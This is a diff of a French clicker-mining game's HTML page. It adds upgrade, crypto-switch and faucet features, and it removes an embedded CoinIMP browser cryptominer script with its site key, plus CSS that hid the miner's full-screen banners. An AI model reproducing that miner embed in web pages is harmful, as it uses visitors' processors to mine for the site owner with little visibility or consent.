@@ -3,19 +3,55 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>deadspot-clicker-empire</title>
-    <meta name="description" content="Lovable Generated Project" />
+    <title>Deadspot Clicker Empire</title>
+    <meta name="description" content="Jeu de clic avec upgrades et minage" />
     <meta name="author" content="Lovable" />
-    <meta property="og:title" content="deadspot-clicker-empire" />
-    <meta property="og:description" content="Lovable Generated Project" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@lovable_dev" />
-    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-
     <style>
-      /* Notification de minage */
+      /* Styles de base */
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        text-align: center;
+      }
+
+      .btn {
+        padding: 10px 20px;
+        margin: 10px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+
+      .mining-btn {
+        background-color: #4CAF50;
+        color: white;
+      }
+
+      .upgrade-btn {
+        background-color: #ff9800;
+        color: white;
+      }
+
+      .crypto-btn {
+        background-color: #2196F3;
+        color: white;
+      }
+
+      .disabled {
+        background-color: #ddd;
+        cursor: not-allowed;
+      }
+
+      .stats {
+        margin-top: 20px;
+      }
+
+      .stats span {
+        font-size: 18px;
+        margin-right: 15px;
+      }
+
       #miningNotification {
         position: fixed;
         bottom: 10px;
@@ -29,74 +65,6 @@
         width: 300px;
         transition: all 0.3s ease;
       }
-
-      #miningNotification.minimized {
-        width: 150px;
-        height: 20px;
-        overflow: hidden;
-        white-space: nowrap;
-        text-overflow: ellipsis;
-        padding: 5px;
-      }
-
-      #miningNotificationToggle {
-        cursor: pointer;
-        float: right;
-        background: transparent;
-        border: none;
-        color: #ccc;
-        font-size: 12px;
-      }
-
-      /* Style du bouton de minage */
-      .mining-btn {
-        background-color: #4CAF50;
-        color: white;
-        padding: 15px 32px;
-        font-size: 16px;
-        margin-top: 20px;
-        border: none;
-        cursor: pointer;
-        border-radius: 8px;
-        display: block;
-        margin-left: auto;
-        margin-right: auto;
-      }
-
-      .mining-btn:disabled {
-        background-color: #ddd;
-        cursor: not-allowed;
-      }
-
-      /* Style pour afficher les stats */
-      .stats {
-        margin-top: 20px;
-        text-align: center;
-      }
-
-      .stats span {
-        font-size: 18px;
-        margin-right: 10px;
-      }
-    </style>
-
-    <style>
-      /* Force les iframes CoinIMP à se positionner mini en bas à droite */
-      iframe[src*="coinimp"] {
-        position: fixed !important;
-        bottom: 10px !important;
-        right: 10px !important;
-        width: 200px !important;
-        height: 112px !important;
-        z-index: 9999 !important;
-        border-radius: 8px !important;
-        box-shadow: 0 0 8px #00ff99;
-      }
-
-      /* Supprime les bannières CoinIMP qui couvrent tout l'écran */
-      div[style*="z-index: 2147483647"] {
-        display: none !important;
-      }
     </style>
   </head>
 
@@ -107,66 +75,100 @@
     <div class="stats">
       <span id="miningPoints">Points de Minage : 0</span>
       <span id="energy">Énergie : 100</span>
+      <span id="miningSpeed">Vitesse de Minage : 0.0001 GH/Z</span>
+      <span id="currentCrypto">Crypto Actuelle : Dogecoin</span>
     </div>
 
-    <!-- Bouton de minage -->
-    <button id="miningButton" class="mining-btn">Cliquez pour miner</button>
+    <!-- Boutons de minage et upgrades -->
+    <button id="miningButton" class="btn mining-btn">Cliquez pour miner</button>
+    <button id="upgradeMiningButton" class="btn upgrade-btn">Améliorer Force de Minage (Coût: 100 points)</button>
+    <button id="changeCryptoButton" class="btn crypto-btn">Changer Crypto (Une fois par jour)</button>
 
-    <!-- Script principal Vite (React) -->
-    <script type="module" src="/src/main.tsx"></script>
-
-    <!-- Script de minage CoinIMP -->
-    <script src="https://www.hostingcloud.racing/MFIJ.js"></script>
-
+    <!-- Script principal -->
     <script>
-      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.15, c: 'w', ads: 0
-      });
-      _client.start();
-      _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f");
-
-      // Variables pour gérer les points de minage et l'énergie
       let miningPoints = 0;
       let energy = 100;
+      let miningSpeed = 0.0001; // Force de minage initiale
+      let currentCrypto = 'Dogecoin';
+      let cryptoOptions = ['Dogecoin', 'MATIC', 'TRX', 'Ravecoin'];
 
+      // Sélection des éléments HTML
       const miningButton = document.getElementById('miningButton');
       const miningPointsDisplay = document.getElementById('miningPoints');
       const energyDisplay = document.getElementById('energy');
+      const miningSpeedDisplay = document.getElementById('miningSpeed');
+      const currentCryptoDisplay = document.getElementById('currentCrypto');
+      const upgradeMiningButton = document.getElementById('upgradeMiningButton');
+      const changeCryptoButton = document.getElementById('changeCryptoButton');
 
-      // Fonction pour récupérer des points de minage
+      // Fonction pour miner
       function mine() {
         if (energy > 0) {
-          miningPoints += 10; // 10 points de minage par clic
-          energy -= 5; // Consomme 5 points d'énergie par clic
+          miningPoints += miningSpeed * 1000; // Plus de points avec une force de minage plus grande
+          energy -= 5; // Consomme 5 unités d'énergie par clic
           updateDisplay();
         } else {
           alert("Pas assez d'énergie pour miner !");
         }
       }
 
-      // Fonction pour mettre à jour l'affichage des stats
-      function updateDisplay() {
-        miningPointsDisplay.innerText = "Points de Minage : " + miningPoints;
-        energyDisplay.innerText = "Énergie : " + energy;
-        // Désactive le bouton si l'énergie est épuisée
-        if (energy <= 0) {
-          miningButton.disabled = true;
+      // Fonction pour améliorer la force de minage
+      function upgradeMining() {
+        if (miningPoints >= 100) {
+          miningPoints -= 100; // Coût de l'upgrade
+          miningSpeed += 0.0001; // Augmente la vitesse de minage
+          updateDisplay();
         } else {
-          miningButton.disabled = false;
+          alert("Pas assez de points pour l'upgrade !");
         }
       }
 
-      // Ajout d'un écouteur pour le bouton de minage
-      miningButton.addEventListener('click', mine);
+      // Fonction pour changer de crypto
+      function changeCrypto() {
+        let randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
+        currentCrypto = randomCrypto;
+        currentCryptoDisplay.innerText = "Crypto Actuelle : " + currentCrypto;
+        alert("Vous avez changé de crypto pour " + randomCrypto + " !");
+      }
 
-      // Fonction pour recharger l'énergie automatiquement après un délai
+      // Fonction pour mettre à jour l'affichage
+      function updateDisplay() {
+        miningPointsDisplay.innerText = "Points de Minage : " + miningPoints.toFixed(4);
+        energyDisplay.innerText = "Énergie : " + energy;
+        miningSpeedDisplay.innerText = "Vitesse de Minage : " + miningSpeed.toFixed(4) + " GH/Z";
+      }
+
+      // Fonction pour le faucet aléatoire
+      function faucet() {
+        let randomValue = Math.random();
+        let reward = 0;
+        if (randomValue < 0.12) {
+          reward = 15; // 12% de chance d'obtenir 15 GH/Z
+        } else {
+          reward = (Math.random() * (0.0013 - 0.0001) + 0.0001).toFixed(4); // Random entre 0.0001 et 0.0013
+        }
+        miningPoints += parseFloat(reward);
+        alert("Vous avez reçu " + reward + " GH/Z de force de minage !");
+        updateDisplay();
+      }
+
+      // Recharge automatique de l'énergie
       setInterval(() => {
         if (energy < 100) {
           energy += 2; // Recharge 2 unités d'énergie toutes les 10 secondes
-          if (energy > 100) energy = 100; // Limite l'énergie à 100
+          if (energy > 100) energy = 100;
           updateDisplay();
         }
       }, 10000); // toutes les 10 secondes
+
+      // Event listeners pour les boutons
+      miningButton.addEventListener('click', mine);
+      upgradeMiningButton.addEventListener('click', upgradeMining);
+      changeCryptoButton.addEventListener('click', changeCrypto);
+
+      // Lancement du faucet (pour test, peut être activé manuellement ou intégré à un bouton)
+      faucet();
     </script>
   </body>
 </html>
+
